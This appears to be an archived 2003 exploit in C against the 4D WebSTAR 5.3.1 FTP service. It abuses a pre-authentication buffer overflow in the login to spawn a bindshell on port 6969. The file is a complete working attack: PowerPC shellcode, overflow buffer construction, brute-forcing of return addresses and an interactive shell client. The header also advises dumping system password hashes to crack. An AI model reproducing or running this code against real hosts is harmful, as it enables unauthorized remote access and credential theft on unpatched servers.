/*

Remote Vulnerability in 4D WebSTAR Server Suite - Exploit
================================================

Date: 11.09.2003
Author: B-r00t. 2003.
Email: B-r00t blueyonder.co.uk

Reference: http://www.4d.com/products/webstar.html
Versions: 4D WebSTAR 5.3.1 (Latest) => VULNERABLE.
Tested: 4D WebSTAR 5.3.1 (Trial Version).

Exploit: 4DWS_ftp.c - On success a bindshell is spawned
on port 6969. Although the resulting shell is
UID 'webstart', it is usually possible to
execute 'nidump passwd .' to obtain the system
password hashes for cracking. 

Compile: gcc -o 4DWS_ftp 4DWS_ftp.c

Description: There is a pre authentication buffer overflow
that exists in the login mechanism of the WebSTAR
FTP service. See advisory for further details.

Remember Kiddiez ... An Apple A Day ...!!!!
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <netdb.h>

// Defines
#define EXPLOIT "4DWS_ftp"
#define BINDSHELL_PORT 6969
#define FTP_PORT 21
#define MAXSIZE 1024

// Prototypes
int usage (void);
int get_connect (int port, char *host);
int send_sock (char *buff);
int read_sock (char *buff);
int check_bindshell(int port, char *host);

//Variables
int sock, port=21, lsb;
char evilbuff[MAXSIZE], temp[MAXSIZE];
char user[] = "USER 4D4D" "\x0d\x0a";
char retaddy[5], filler[MAXSIZE];
unsigned long int ret, loop;

int main (int argc, char *argv[])
{
char shellcode[] = //PPC forkin bindshell 6969 by B-r00t.2003.
"\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x68\x02\xa6\x3b\xeb\x01\x70"
"\x39\x80\x01\x70\x3b\xdf\xff\x88\x7c\xbe\x29\xae\x3b\xdf\xff\x89"
"\x7c\xbe\x29\xae\x3b\xdf\xff\x8a\x7c\xbe\x29\xae\x3b\xdf\xff\x8b"
"\x7c\xbe\x29\xae\x38\x6c\xfe\x92\x38\x8c\xfe\x91\x38\xac\xfe\x96"
"\x38\x0c\xfe\xf1\x44\xff\xff\x02\x60\x60\x60\x60\x7c\x67\x1b\x78"
"\x38\x9f\xff\x84\x38\xac\xfe\xa0\x38\x0c\xfe\xf8\x44\xff\xff\x02"
"\x60\x60\x60\x60\x7c\xe3\x3b\x78\x38\x8c\xfe\x91\x38\x0c\xfe\xfa"
"\x44\xff\xff\x02\x60\x60\x60\x60\x7c\xe3\x3b\x78\x38\x8c\xfe\x90"
"\x38\xac\xfe\x90\x38\x0c\xfe\xae\x44\xff\xff\x02\x60\x60\x60\x60"
"\x38\x8c\xfe\x90\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60"
"\x38\x8c\xfe\x91\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60"
"\x38\x8c\xfe\x92\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60"
"\x38\x0c\xfe\x92\x44\xff\xff\x02\x60\x60\x60\x60\x39\x1f\xff\x83"
"\x7c\xa8\x29\xae\x38\x7f\xff\x7c\x90\x61\xff\xf8\x90\xa1\xff\xfc"
"\x38\x81\xff\xf8\x38\x0c\xfe\xcb\x44\xff\xff\x02\x41\x41\x41\x41"
"\x41\x41\x41\x41\x2f\x62\x69\x6e\x2f\x73\x68\x58\xff\x02\x1b\x39"
"\x41\x41\x41\x41"; // Yu Cant Get This Stuff In Storez Man!!!

char nops[] =
"\x60\x60\x60\x60\x60\x60\x60\x60";

printf ("\n%s by B-r00t <br00t@blueyonder.co.uk>. (c) 2003.\n", 
EXPLOIT);
printf ("\nExploits the pre authentication buffer overflow in 
the");
printf ("\nWebSTAR 5.3.1 FTP service.");

if (argc < 2)
usage ();

printf ("\nPatience ...\n\n");

memset(filler, '\0', sizeof(filler));
memset(filler, 0x78, 173);
filler[0] = 'P';
filler[1] = 'A';
filler[2] = 'S';
filler[3] = 'S';
filler[4] = 0x20;

for (lsb=0; lsb<9; lsb+=4) {//Increase range if no succcess. 
for (loop=0xf018f504+lsb; loop<0xf028f505+lsb; loop+=0x1000)
{
ret=loop;
printf ("\n[0x%x] ", ret);
retaddy[0] = (int)((ret & 0xff000000) >> 24);
retaddy[1] = (int)((ret & 0x00ff0000) >> 16);
retaddy[2] = (int)((ret & 0x0000ff00) >> 8);
retaddy[3] = (int) (ret & 0x000000ff);
retaddy[4] = '\0';

memset(evilbuff, '\0', sizeof(evilbuff));
strcpy (evilbuff, filler);
strcat (evilbuff, retaddy);
strcat (evilbuff, nops);
strcat (evilbuff, shellcode);
strcat (evilbuff, "\x0d\x0a");

if ((sock=socket(AF_INET, SOCK_STREAM, 6)) == -1)
{
perror(" Retrying! ");
loop-=0x1000;
sleep(2);
continue;
}

if (get_connect(FTP_PORT, argv[1]) ==-1)
{
perror(" Retrying! ");
loop-=0x1000;
sleep(2);
close(sock);
continue;
}
read_sock(temp);
send_sock (user);
read_sock(temp);
send_sock (evilbuff);
read_sock(temp);
close(sock);
sleep(3);// Let service respawn!

check_bindshell(BINDSHELL_PORT, argv[1]);
}}
printf("\n\nIf its still up... Go Again!\n\n");
exit(0);
}//End_Main


//Check For Bindshell 6969
int check_bindshell(int port, char *host)
{
fd_set rfds;
int sel=0, rd=0;
char *ptr = temp;
memset(temp, '\0', MAXSIZE);

if((sock=socket(AF_INET, SOCK_STREAM, 6))== -1)
{
perror("Socket Error.");
return -1;
}

if (get_connect(port, host) <0)
{ 
close (sock);
return -1;
}
else printf (" Yay~!\n\aWo0tWo0t! ... We got a shell on 
%s!\n\n>", host);

// Start clean ..
fflush(stdin);
fflush(stdout);
fflush(stderr);

do {
FD_ZERO(&rfds);
FD_SET(0, &rfds);
FD_SET(sock, &rfds);
sel=select(sock+1, &rfds, NULL, NULL, NULL);
memset(temp, '\0', MAXSIZE);
if (sel) {

if(FD_ISSET(sock, &rfds)) {
rd=(read_sock(temp));
printf("%s", temp);
}
if(FD_ISSET(0, &rfds)) {
rd=(read(0, ptr, MAXSIZE-1));
send_sock(temp);
}
}
} while( sel && rd );
close(sock);
printf ("\nShell Aborted!\n");
exit(0);
} 


//Do Socket Connect
int get_connect (int port, char *host)
{
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if (! inet_aton(host, &(dest_addr.sin_addr)))
return -1;

memset( &(dest_addr.sin_zero), '\0', 8);
if (connect (sock, (struct sockaddr *)&dest_addr, sizeof 
(struct sockaddr)) == -1)
{
printf(" Fail!");
close(sock);
return -1;
}
else return 0;
}

//Send Data To Socket
int send_sock (char *buff)
{
int bytes = 0;
bytes = (send (sock, buff, strlen(buff), 0));
if (bytes == -1) 
{
perror("Send Error.");
close(sock);
return -1;
}
else return bytes;
}

//Read Data From Socket
int read_sock (char *buff)
{
int bytes = 0;
bytes = (recv (sock, buff, MAXSIZE-1, 0));
if (bytes == -1) 
{
perror ("Recv Error.");
close(sock);
return -1;
}
else return bytes;
}

//Usage Message
int usage (void)
{
printf ("\n\nUsage: %s [IP_ADDRESS] ", EXPLOIT);
printf ("\nExample: %s 10.0.0.1 \n\n", EXPLOIT);
exit (-1);
}

// milw0rm.com [2003-09-11]